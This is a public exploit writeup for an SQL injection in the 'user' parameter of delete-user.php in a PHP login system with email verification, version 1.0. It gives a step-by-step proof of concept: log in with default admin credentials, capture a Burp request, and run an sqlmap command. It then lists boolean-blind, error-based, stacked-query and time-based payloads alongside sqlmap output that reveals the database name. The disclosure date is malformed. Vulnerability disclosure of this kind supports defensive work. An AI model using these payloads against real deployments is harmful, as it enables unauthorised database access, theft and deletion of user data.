# Login_System_with_Email_Verification_SQL_Injection

+ **Exploit Title:** Login_System_with_Email_Verification_SQL_Injection
+ **Date:** 2024-15-01
+ **Exploit Author:** Burak Sevben
+ **Vendor Homepage:** https://www.sourcecodester.com/php/17085/login-system-email-verification-using-php-phpmailer-and-mysql-source-code.html
+ **Software Link:** https://www.sourcecodester.com/download-code?nid=17085&title=Login+System+with+Email+Verification+Using+PHP%2C+PHPMailer+and+MySQL+with+Source+Code
+ **Version:** 1.0
+ **Tested on:** Kali Linux + PHP 8.2.12, Apache 2.4.58
+ **CVE:** Reported, waiting for CVE number


## Description:
Login System with Email Verification 1.0 allows SQL Injection via the 'user' parameter in "/login-system-with-email-verification/endpoint/delete-user.php?user=1". Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit the latest vulnerabilities in the underlying database.


## Proof of Concept:
+ Go to : "http://localhost/login-system-with-email-verification/"
+ Login with `admin`:`admin`
+ You will see users listed (if there are no users, you can create and test them yourself)
+ Press delete button to delete any user
+ Capture the request via Burp Suite and send it to the Repeater.
+ Copy the request and paste it into an "r.txt" file.
+ Captured Burp request:
```
GET /login-system-with-email-verification/endpoint/delete-user.php?user=1 HTTP/1.1
Host: localhost
sec-ch-ua: "Not A(Brand";v="24", "Chromium";v="110"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Linux"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.78 Safari/537.36
```

+ Use sqlmap to exploit. In sqlmap, use 'user' parameter to dump the database.
```
sqlmap -r r.txt -p user --risk 3 --level 5 --dbms mysql --proxy="http://127.0.0.1:8080" --batch --current-db
```
```
Parameter: user (GET)
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: user=1' RLIKE (SELECT (CASE WHEN (8914=8914) THEN 1 ELSE 0x28 END))-- yPHd

    Type: error-based
    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
    Payload: user=1' AND EXTRACTVALUE(1135,CONCAT(0x5c,0x7178786a71,(SELECT (ELT(1135=1135,1))),0x716a717071))-- QTBB

    Type: stacked queries
    Title: MySQL >= 5.0.12 stacked queries (comment)
    Payload: user=1';SELECT SLEEP(5)#

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: user=1' AND (SELECT 5720 FROM (SELECT(SLEEP(5)))eLut)-- FJtg
---
[20:11:47] [INFO] the back-end DBMS is MySQL
web application technology: Apache 2.4.58, PHP 8.2.12
back-end DBMS: MySQL >= 5.1 (MariaDB fork)
[20:11:47] [INFO] fetching current database
[20:11:47] [INFO] retrieved: 'login_email_verification'
current database: 'login_email_verification'
```
+ current database: `login_email_verification`

![Ekran görüntüsü 2024-01-15 041320](https://github.com/BurakSevben/Login_System_with_Email_Verification_SQL_Injection/assets/117217689/64edf624-3fec-491b-b2fc-91b2b1f0af2b)


